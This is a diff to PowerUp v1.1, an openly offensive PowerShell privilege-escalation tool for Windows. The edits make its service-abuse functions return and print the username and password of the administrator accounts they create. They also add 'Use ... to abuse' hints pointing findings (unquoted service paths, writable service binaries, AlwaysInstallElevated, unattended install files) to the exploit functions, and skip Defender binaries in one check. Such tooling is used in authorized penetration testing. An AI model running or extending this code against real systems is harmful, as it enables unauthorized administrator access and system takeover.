@@ -2,6 +2,8 @@
 
 PowerUp v1.1
 
+-output account added
+
 Various methods to abuse local services to assist
 with escalation on Windows systems.
 
@@ -76,9 +78,10 @@ function Get-ServiceEXEPerms {
         foreach ($service in $services){
             try{
                 # strip out any arguments and get just the executable
-                $path = ($service.pathname.Substring(0, $service.pathname.IndexOf(".exe") + 4)).Replace("`"","")
+                $path = ($service.pathname.Substring(0, $service.pathname.IndexOf(".exe") + 4)).Replace('"',"")
 
-                if (Test-Path $path){
+                # exclude these two false-positive binaries
+                if ($(Test-Path $path) -and $(-not $path.Contains("NisSrv.exe")) -and $(-not $path.Contains("MsMpEng.exe"))) {
                     # try to open the file for writing, immediately closing it
                     $file = Get-Item $path -Force
                     $stream = $file.OpenWrite()
@@ -168,7 +171,7 @@ function Invoke-ServiceUserAdd {
     Group to add the user to (default of Administrators)
         
     .OUTPUTS
-    System.bool. True if the add succeeded, false otherwise.
+    System.bool. The user/password created if successful, false otherwise.
 
     .EXAMPLE
     > Invoke-ServiceUserAdd -ServiceName VulnSVC
@@ -277,7 +280,7 @@ function Invoke-ServiceUserAdd {
                 $result = sc.exe start $($TargetService.Name)
             }
 
-            $true
+            @($UserName, $Password)
 
         }
         catch{
@@ -367,8 +370,7 @@ function Write-UserAddServiceBinary {
     try {
         # write the binary array out to the specified path
         Set-Content -value $Binary -encoding byte -path $Path
-        Write-Verbose "Service binary written out to '$Path'"
-        $true
+        "[*] Binary for service '$ServiceName' to create user '$UserName:$Password' written to '$Path'"
     }
     catch {
         Write-Warning "Error while writing to location '$Path': $_"
@@ -401,8 +403,8 @@ function Write-UserAddMSI {
 
     try {
         [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
-        "Service binary written out to '$Path'"
-        $true
+        Write-Verbose "Service binary written out to '$Path'"
+        $Path
     }
     catch {
         Write-Warning "Error while writing to location '$Path': $_"
@@ -1217,14 +1219,15 @@ function Invoke-AllChecks {
 
     # # the array for our initial status output messages
     $StatusOutput = @()
-    $StatusOutput += "`nRunning Invoke-AllChecks"
+    $StatusOutput += "`n[*] Running Invoke-AllChecks"
 
 
     # Windows service checks
 
-    $StatusOutput += "`n`nChecking for unquoted service paths...`n"
+    $StatusOutput += "`n`n[*]Checking for unquoted service paths...`n"
     $UnquotedServices = Get-ServiceUnquoted
     if ($UnquotedServices){
+        $StatusOutput += "[*] Use 'Write-UserAddServiceBinary' to abuse"
         foreach ($Service in $UnquotedServices){
             $StatusOutput += "[+] Unquoted service path: $($Service.ServiceName) - $($Service.Path)"
         }
@@ -1233,14 +1236,16 @@ function Invoke-AllChecks {
     $StatusOutput += "`n`nChecking service executable permissions...`n"
     $ServiceEXEs = Get-ServiceEXEPerms
     if ($ServiceEXEs){
+        $StatusOutput += "[*] Use 'Write-ServiceEXE -ServiceName SVC' to abuse"
         foreach ($ServiceEXE in $ServiceEXEs){
             $StatusOutput += "[+] Vulnerable service executable: $($ServiceEXE.ServiceName) - $($ServiceEXE.Path)"
         }
     }
 
-    $StatusOutput += "`n`nChecking service permissions...`n"
+    $StatusOutput += "`n`n[*] Checking service permissions...`n"
     $VulnServices = Get-ServicePerms
     if ($VulnServices){
+        $StatusOutput += "[*] Use 'Invoke-ServiceUserAdd' to abuse"
         foreach ($Service in $VulnServices){
             $StatusOutput += "[+] Vulnerable service: $($Service.ServiceName) - $($Service.Path)"
         }
@@ -1249,15 +1254,16 @@ function Invoke-AllChecks {
 
     # other checks
 
-    $StatusOutput += "`n`nChecking for unattended install files...`n"
+    $StatusOutput += "`n`n[*] Checking for unattended install files...`n"
     $InstallFiles = Get-UnattendedInstallFiles
     if ($InstallFiles){
+        $StatusOutput += "[*] Examine install files for possible passwords"
         foreach ($File in $InstallFiles){
             $StatusOutput += "[+] Unattended install file: $File"
         }
     }
 
-    $StatusOutput += "`n`nChecking %PATH% for potentially hijackable service .dll locations...`n"
+    $StatusOutput += "`n`n[*] Checking %PATH% for potentially hijackable service .dll locations...`n"
     $HijackablePaths = Invoke-FindPathDLLHijack
     if ($HijackablePaths){
         foreach ($Path in $HijackablePaths){
@@ -1265,12 +1271,13 @@ function Invoke-AllChecks {
         }
     }
 
-    $StatusOutput += "`n`nChecking for AlwaysInstallElevated registry key...`n"
+    $StatusOutput += "`n`n[*] Checking for AlwaysInstallElevated registry key...`n"
     if (Get-RegAlwaysInstallElevated){
+        $StatusOutput += "[*] Use 'Write-UserAddMSI' to abuse"
         $StatusOutput += "[+] AlwaysInstallElevated is enabled for this machine!"
     }
 
-    $StatusOutput += "`n`nChecking for Autologon credentials in registry...`n"
+    $StatusOutput += "`n`n[*] Checking for Autologon credentials in registry...`n"
     $AutologonCreds = Get-RegAutoLogon
     if ($AutologonCreds){
         try{
